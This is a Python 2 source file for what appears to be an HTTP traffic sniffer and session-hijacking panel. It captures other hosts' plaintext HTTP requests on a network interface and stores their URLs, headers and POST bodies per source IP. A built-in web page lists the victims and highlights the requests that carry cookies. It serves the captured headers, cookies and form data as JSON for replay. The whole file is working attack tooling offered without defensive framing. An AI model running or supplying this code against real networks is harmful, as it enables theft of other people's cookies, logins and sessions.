#coding:utf-8
import sys
from collections import defaultdict
from scapy.all import *
import scapy_http.http as http
import urllib
import threading
from collections import defaultdict


host = '0.0.0.0'
server_ip = sys.argv[1]
port = int(sys.argv[2])
buffsize = 10240
iface = sys.argv[3]

httphead = 'HTTP/1.1 200 ok\r\n\r\n'
ip_dict = defaultdict(dict)

proxy_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
proxy_sock.bind((host,port))
proxy_sock.listen(1024)

def prn(ptk):
	global html
	global ip_dict
	if not ptk.haslayer(http.HTTPRequest):return None
	print ptk.summary()
	url = 'http://'+ptk.Host+ptk.Path
	headers = {i.split(':')[0]:i.split(':')[1] for i in ptk.Headers.split('\r\n') if ':' in i}
	data = ptk.load if ptk.Method == 'POST' else 'None'
	ip_dict[ptk[IP].src][url] = (ptk.Method,headers,data)

sniff_thread = threading.Thread(target=sniff,kwargs={'iface':iface,'prn':prn,'filter':'tcp[13]&8==8'}) #flags has P
sniff_thread.setDaemon(True)
sniff_thread.start()

while True:
	conn,addr = proxy_sock.accept()
	print 'client connected:{0}:{1}'.format(addr[0],addr[1])

	client_data = conn.recv(buffsize)

	try:
		req_body = http.HTTPRequest(client_data)
	except Exception,e:
		print e
		continue

	method = req_body.Method
	print method

	if method not in ['GET','POST']:continue
	print 'Host',req_body.Host
	print 'Path',req_body.Path

	if req_body.Host == server_ip or req_body.Host == server_ip+':%d'%port:
		if req_body.Path == '/':
			html = ''
			html += '<br>\n'.join(['<a href="{0}">{0}<a>'.format(i) for i in ip_dict.keys()])
			conn.send(httphead+html)
			conn.close()
		elif req_body.Path[1:] in ip_dict.keys():
			ip = req_body.Path[1:]
			html = '</br>\n'.join(['<a href="{0}/{1}" style="color:{2}">{3}=====>{4}<a>'.format(ip,url.encode('base64'),'#FF3811' if 'cookie' in [i.lower() for i in value[1].keys()] else '#4590F9', value[0], url[:100]) for url,value in ip_dict[ip].items()]) #has cookie?
			conn.send(httphead+html)
			conn.close()
		else:
			a = req_body.Path.split('/')
			if len(a) < 3: continue
			try:
				ip = a[1]
				url = '/'.join(a[2:]).decode('base64')
				print url
				method, headers, data = ip_dict[ip][url]
				if headers.has_key('Proxy-Connection'):headers.pop('Proxy-Connection') #???? 
				conn.send(httphead+json.dumps({'method':method, 'headers':headers, 'data':urllib.quote(data)}))
				conn.close()
			except Exception,e:
				print e
				conn.close()
				continue
	else:
		conn.send(httphead+'<p>error</p>')
		conn.close()

proxy_sock.close()
print 'python proxy close'
